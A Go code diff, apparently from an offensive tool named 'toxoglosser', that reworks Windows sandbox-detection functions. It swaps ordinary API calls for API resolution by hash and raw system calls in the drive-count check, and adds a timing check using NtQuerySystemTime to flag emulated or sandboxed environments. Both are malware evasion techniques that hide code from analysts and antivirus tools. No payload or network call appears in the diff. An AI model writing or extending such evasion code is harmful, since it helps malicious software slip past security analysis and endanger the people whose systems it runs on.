@@ -6,9 +6,12 @@ import (
 	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
+	"toxoglosser/common"
 )
 
-// IsSandboxEnvironment checks for multiple sandbox indicators including BIOS
+// IsSandboxEnvironment checks for multiple sandbox indicators including BIOS vendors.
+// This function performs various checks to detect if the current process is running
+// in a sandboxed or virtualized environment, returning true if any indicators are found.
 func IsSandboxEnvironment() bool {
 	// Drive count check (typical sandbox has fewer drives)
 	if checkDriveCount() {
@@ -62,19 +65,83 @@ func IsSandboxEnvironment() bool {
 func checkDriveCount() bool {
 	drives := make([]uint16, 256)
 	drivesLen := uint32(len(drives))
-	
-	kernel32 := windows.NewLazyDLL("kernel32.dll")
-	procGetLogicalDriveStrings := kernel32.NewProc("GetLogicalDriveStringsW")
-	
-	ret, _, _ := procGetLogicalDriveStrings.Call(
-		uintptr(drivesLen), 
+
+	// Manually resolve GetLogicalDriveStringsW function
+	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazyDLL("kernel32.dll")
+		procGetLogicalDriveStrings := kernel32.NewProc("GetLogicalDriveStringsW")
+
+		ret, _, _ := procGetLogicalDriveStrings.Call(
+			uintptr(drivesLen),
+			uintptr(unsafe.Pointer(&drives[0])),
+		)
+
+		if ret == 0 {
+			return false // Error occurred, default to not sandbox
+		}
+
+		// Count null-terminated strings to determine number of drives
+		count := 0
+		for i := 0; i < len(drives); i++ {
+			if drives[i] == 0 {
+				count++
+				// Skip to the next non-null character
+				for i < len(drives) && drives[i] == 0 {
+					i++
+				}
+				i-- // Compensate for the loop increment
+			}
+		}
+
+		// If less than 2 drives, likely a sandbox
+		return count < 2
+	}
+
+	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "GetLogicalDriveStringsW")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazyDLL("kernel32.dll")
+		procGetLogicalDriveStrings := kernel32.NewProc("GetLogicalDriveStringsW")
+
+		ret, _, _ := procGetLogicalDriveStrings.Call(
+			uintptr(drivesLen),
+			uintptr(unsafe.Pointer(&drives[0])),
+		)
+
+		if ret == 0 {
+			return false // Error occurred, default to not sandbox
+		}
+
+		// Count null-terminated strings to determine number of drives
+		count := 0
+		for i := 0; i < len(drives); i++ {
+			if drives[i] == 0 {
+				count++
+				// Skip to the next non-null character
+				for i < len(drives) && drives[i] == 0 {
+					i++
+				}
+				i-- // Compensate for the loop increment
+			}
+		}
+
+		// If less than 2 drives, likely a sandbox
+		return count < 2
+	}
+
+	// Actually call the function via raw syscall
+	ret, _, _ := syscall.SyscallN(
+		addr,
+		uintptr(drivesLen),
 		uintptr(unsafe.Pointer(&drives[0])),
 	)
-	
+
 	if ret == 0 {
 		return false // Error occurred, default to not sandbox
 	}
-	
+
 	// Count null-terminated strings to determine number of drives
 	count := 0
 	for i := 0; i < len(drives); i++ {
@@ -87,7 +154,7 @@ func checkDriveCount() bool {
 			i-- // Compensate for the loop increment
 		}
 	}
-	
+
 	// If less than 2 drives, likely a sandbox
 	return count < 2
 }
@@ -420,13 +487,64 @@ func toLower(s string) string {
 	return string(b)
 }
 
-// checkTiming uses RDTSC for timing checks (simplified)
+// checkTiming uses timing-based checks for sandbox detection
 func checkTiming() bool {
 	// In a sandbox, operations might execute faster due to optimization
-	// This is difficult to implement properly in Go without causing issues
-	// For now, we'll return false, but in a real implementation,
-	// this would use RDTSC to measure execution time of specific operations
-	
-	// This would require assembly or use of the runtime.nanotime function
+	// or slower due to virtualization overhead
+	// This checks for anomalous timing behavior that could indicate a sandboxed environment
+
+	// Method 1: Perform a simple CPU-intensive operation and measure time
+	var startTime int64
+	var endTime int64
+
+	// Get start time using manual API resolution
+	hNtdll, err := common.GetModuleHandleByHash("ntdll.dll")
+	if err != nil {
+		// If we can't get the function, we can't do timing checks
+		return false
+	}
+
+	addr, err := common.GetProcAddressByHash(windows.Handle(hNtdll), "NtQuerySystemTime")
+	if err != nil {
+		// If we can't get the function, we can't do timing checks
+		return false
+	}
+
+	// Call NtQuerySystemTime to get start time
+	sysTime := int64(0)
+	ret, _, _ := syscall.SyscallN(addr, uintptr(unsafe.Pointer(&sysTime)))
+	if ret != 0 { // STATUS_SUCCESS is 0
+		// If the call failed, we can't do timing checks
+		return false
+	}
+	startTime = sysTime
+
+	// Perform a simple operation multiple times
+	result := uint64(0)
+	for i := 0; i < 1000000; i++ { // Increased iterations for more accurate timing
+		result += uint64(i * i)
+	}
+
+	// Call NtQuerySystemTime to get end time
+	ret, _, _ = syscall.SyscallN(addr, uintptr(unsafe.Pointer(&sysTime)))
+	if ret != 0 { // STATUS_SUCCESS is 0
+		// If the call failed, we can't do timing checks
+		return false
+	}
+	endTime = sysTime
+
+	// Calculate elapsed time (in 100-nanosecond intervals)
+	elapsed := endTime - startTime
+
+	// If the operation completed unusually quickly, it might be in a sandbox
+	// Note: NtQuerySystemTime returns time in 100-nanosecond intervals since January 1, 1601
+	// An extremely fast completion could indicate an emulated/sandboxed environment
+	// This threshold needs fine-tuning based on testing
+	if elapsed < 10000 { // Less than 1 millisecond for the operation
+		return true
+	}
+
+	// Method 2: Check for consistent timing (some sandboxes might have timing inconsistencies)
+	// This is a simplified check - in real implementations, more sophisticated methods are needed
 	return false
 }
